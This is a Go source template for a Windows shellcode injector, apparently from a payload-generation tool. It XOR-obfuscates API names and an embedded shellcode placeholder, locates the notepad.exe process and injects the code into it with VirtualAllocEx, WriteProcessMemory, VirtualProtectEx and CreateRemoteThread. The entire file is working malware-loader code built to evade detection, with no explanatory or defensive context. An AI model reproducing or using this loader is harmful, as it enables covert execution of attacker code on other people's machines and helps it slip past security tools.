package main

import (
	"encoding/base64"
	"golang.org/x/sys/windows"
	"strings"
	"syscall"
	"unsafe"
	_ "fmt"
	_ "math"
	_ "os"
)

const TH32CS_SNAPPROCESS = 0x2
const PROCESS_ALL_ACCESS = 2035711

type WindowsProcess struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}

var (
	kernel32           = syscall.MustLoadDLL(encodeString(`{{encode "kernel32.dll" .Key }}`))
	createRemoteThread = kernel32.MustFindProc(encodeString(`{{encode "CreateRemoteThread" .Key }}`))
	virtualAllocEx     = kernel32.MustFindProc(encodeString(`{{encode "VirtualAllocEx" .Key }}`))
	virtualProtectEx   = kernel32.MustFindProc(encodeString(`{{encode "VirtualProtectEx" .Key }}`))
	openProcess        = kernel32.MustFindProc(encodeString(`{{encode "OpenProcess" .Key}}`))
	writeProcessMemory = kernel32.MustFindProc(encodeString(`{{encode "WriteProcessMemory" .Key}}`))
	key                = "{{ .Key }}"
)

func encodeString(s string) (res string) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res += string(tmp[i] ^ x[i%len(x)])
	}
	return
}

func encodeByteArray(s string) (res []byte) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res = append(res, tmp[i]^x[i%len(x)])
	}
	return
}

func getProcesses() ([]WindowsProcess, error) {
	handle, err := windows.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(handle)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	err = windows.Process32First(handle, &entry)
	if err != nil {
		return nil, err
	}

	results := make([]WindowsProcess, 0, 50)

	for {
		results = append(results, newWindowsProcess(&entry))
		err = windows.Process32Next(handle, &entry)

		if err != nil {
			if err == syscall.ERROR_NO_MORE_FILES {
				return results, nil
			}
			return nil, err
		}
	}
}

func newWindowsProcess(e *windows.ProcessEntry32) WindowsProcess {
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}
	return WindowsProcess{
		ProcessID:       int(e.ProcessID),
		ParentProcessID: int(e.ParentProcessID),
		Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
	}
}

func findProcessByName(processes []WindowsProcess, name string) *WindowsProcess {
	for _, p := range processes {
		if strings.ToLower(p.Exe) == strings.ToLower(name) {
			return &p
		}
	}
	return nil
}

func main() {
	sc := encodeByteArray("{{ .ShellcodeEncoded }}")
	n := {{ .Size }}

	procList, _ := getProcesses()
	targetProc := findProcessByName(procList, encodeString(`{{encode "notepad.exe" .Key}}`))

	targetHandle, _, _ := openProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(targetProc.ProcessID))

	addr, _, _ := virtualAllocEx.Call(targetHandle, uintptr(0), uintptr(n), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)

	var nWritten uintptr
	_, _, _ = writeProcessMemory.Call(targetHandle, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(n), uintptr(unsafe.Pointer(&nWritten)))

	var oldProtect uint32
	_, _, _ = virtualProtectEx.Call(targetHandle, addr, uintptr(n), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	attr := new(windows.SecurityAttributes)
	_, _, _ = createRemoteThread.Call(targetHandle, uintptr(unsafe.Pointer(attr)), 0, addr, uintptr(0), 0, 0)
}
